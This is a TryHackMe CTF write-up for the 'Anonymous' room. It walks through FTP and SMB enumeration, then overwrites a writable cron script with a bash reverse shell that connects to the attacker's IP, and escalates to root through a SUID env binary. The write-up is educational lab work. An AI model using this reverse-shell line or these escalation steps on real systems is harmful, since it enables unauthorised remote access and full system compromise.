---
title : "THM: Anonymous WriteUp"
author : Seif-Allah
description : "TryHackMe: WriteUp for the Anonymous room (Level: Medium)"
layout : post
category: CTF-WriteUp
tags : [THM,TryHackMe,WriteUp,Anonymous,Medium,CTF]
image : /assets/images/writeups/thm/anonymous/se.png
---


Welcome, Welcome, Welcome and Welcome ! 
This is a WriteUp for the [*anonymous*](https://tryhackme.com/room/anonymous) room.
I Had a lot of fun solving it and I absolutely recommend it. 

### Enumeration 
```
Discovered open port 21/tcp on 10.10.9.178
Discovered open port 445/tcp on 10.10.9.178
Discovered open port 139/tcp on 10.10.9.178
Discovered open port 22/tcp on 10.10.9.178
```
I couldn't answer the 4th question using the *nmap* output, so I started enumerating the *ftp* server which was allowing the *anonymous login*, and I found some files inside a directory called *scripts* : 
```
-rwxr-xrwx    1 1000     1000          314 Jun 04 19:24 clean.sh
-rw-rw-r--    1 1000     1000         1505 Oct 22 19:45 removed_files.log
-rw-r--r--    1 1000     1000           68 May 12 03:50 to_do.txt
```
The *clean.sh* script looks like it deletes any files inside the /tmp directory : 
```bash
#!/bin/bash

tmp_files=0
echo $tmp_files
if [ $tmp_files=0 ]
then
        echo "Running cleanup script:  nothing to delete" >> /var/ftp/scripts/removed_files.log
else
    for LINE in $tmp_files; do
        rm -rf /tmp/$LINE && echo "$(date) | Removed file /tmp/$LINE" >> /var/ftp/scripts/removed_files.log;done
fi
```
The *removed_files.log* file was filled with : 
```
Running cleanup script:  nothing to delete
```
The *to_do.txt* was just telling that he needs to disable the ftp anonymous login. 


So after enumerating the *ftp* server, let's go back and check the *smb*; but before that let's explain what is *smb*: 
SMB stands for *sever message block*. It’s a protocol for sharing resources like files, printers, in general any resource which should be retrievable or made available by the server. It primarily runs on port 445 or port 139 depending on the server . It is actually natively available in windows, so windows users don’t need to configure anything extra as such besides basic setting up. In linux however ,it is a little different. To make it work for linux, you need to install a samba server because linux natively does not use SMB protocol.

First security flaw in the SMB is using default credentials or easily guessable and sometimes no authentication at all. 
The second flaw is the *samba server* which is extremely vulnerable. 


Ok ,so how do we enumerate when we find that in our nmap scan port 445 is open with samba server on. I only said samba server because linux is predominantly used by enterprises , around 75% to be precise. That being said, the process of enumeration for SMB is the same for both linux and windows with the exception that in linux , you have to check the samba version as well and check if it is vulnerable or not.

I ran *nmap -sC -p 139,445 -sV 10.10.192.43* to know which Samba version is running; 4.7.6
After that I ran *smbmap* to enumerate the Samba server. 
- - -
```bash
root@kali:~/Documents/thm/anonymous# smbmap -H 10.10.192.43 -R
[+] Finding open SMB ports....
[+] Guest SMB session established on 10.10.192.43...
[+] IP: 10.10.192.43:445        Name: 10.10.192.43                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        print$                                                  NO ACCESS       Printer Drivers
        .                                                  
        dr--r--r--                0 Sun May 17 11:11:34 2020    .
        dr--r--r--                0 Thu May 14 01:59:10 2020    ..
        fr--r--r--            42663 Tue May 12 00:43:42 2020    corgo2.jpg
        fr--r--r--           265188 Tue May 12 00:43:42 2020    puppos.jpeg
        pics                                                    READ ONLY       My SMB Share Directory for Pics
        .\
        dr--r--r--                0 Sun May 17 11:11:34 2020    .
        dr--r--r--                0 Thu May 14 01:59:10 2020    ..
        -r--r--r--            42663 Tue May 12 00:43:42 2020    corgo2.jpg
        -r--r--r--           265188 Tue May 12 00:43:42 2020    puppos.jpeg
        IPC$                                                    NO ACCESS       IPC Service (anonymous server (Samba, Ubuntu))
```
- - - 
-H stands for host and -R stands for recursive switch to list all the files. 
Answering Question 4 : The share on the user's computer is **Pics**. 
Now you can actually retrieve the files using smbmap as well, I’ll leave that as an exercise. But what if we wanted a full fledged command prompt like a ftp prompt? That’s very much possible with smbclient. Lets try to do that.
- - -
```bash
root@kali:~/Documents/thm/anonymous# smbclient \\\\10.10.192.43\\pics
Enter WORKGROUP\seifallah's password: 
Try "help" to get a list of possible commands.
smb: \> ls
  .                                   D        0  Sun May 17 11:11:34 2020
  ..                                  D        0  Thu May 14 01:59:10 2020
  corgo2.jpg                          N    42663  Tue May 12 00:43:42 2020
  puppos.jpeg                         N   265188  Tue May 12 00:43:42 2020

                20508240 blocks of size 1024. 13306812 blocks available
```
- - -
I used *get* command to get the images, nothing special about some poppies pics. I used *binwalk* and *strings* but I found nothing. 

### User Flag

So I went back to the ftp server, and took a look again to *clean.sh* file, and since it's executable and writable, I used it to make a reverse shell; script from [pentestmonkey](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet). 

- - - 
```bash
bash -i >& /dev/tcp/10.4.14.245/1234 0>&1
```
- - -
Then I started my local listener, upload the new file using *put* command and waited some seconds for the cronjob to be executed. 

- - -
```ftp 
ftp> put clean.sh 
local: clean.sh remote: clean.sh
200 PORT command successful. Consider using PASV.
150 Ok to send data.
226 Transfer complete.
359 bytes sent in 0.00 secs (4.5649 MB/s)
```
- - -
And boom! we got the reverse shell, easy ! 
- - - 
```bash
root@kali:~# nc -nlvp 1234
listening on [any] 1234 ...
connect to [10.4.14.245] from (UNKNOWN) [10.10.146.152] 55120
bash: cannot set terminal process group (1241): Inappropriate ioctl for device
bash: no job control in this shell
namelessone@anonymous:~$ 
```
- - -
I found the *user.txt* file in the powered directory. 
Now I need some PrivEsc. 

### PrivEsc
Using the hint : *This may require you to do some outside research* first thing came into my mind is SUID files 
- - -
```bash
find / -user root -perm -4000 -exec ls -ldb {} \; 2>/dev/null 
```
- - -
looking at the output, we could use *env* file. 
Using [GTFObins](https://gtfobins.github.io/gtfobins/env/#suid), here's the result : 
- - -
```bash
namelessone@anonymous:~$ /usr/bin/env /bin/bash -p
/usr/bin/env /bin/bash -p
ls
pics
user.txt
whoami
root
```
- - -
Now easily run this command to get the *root.txt* file.
- - -
```bash
cat /root/root.txt
```
- - -

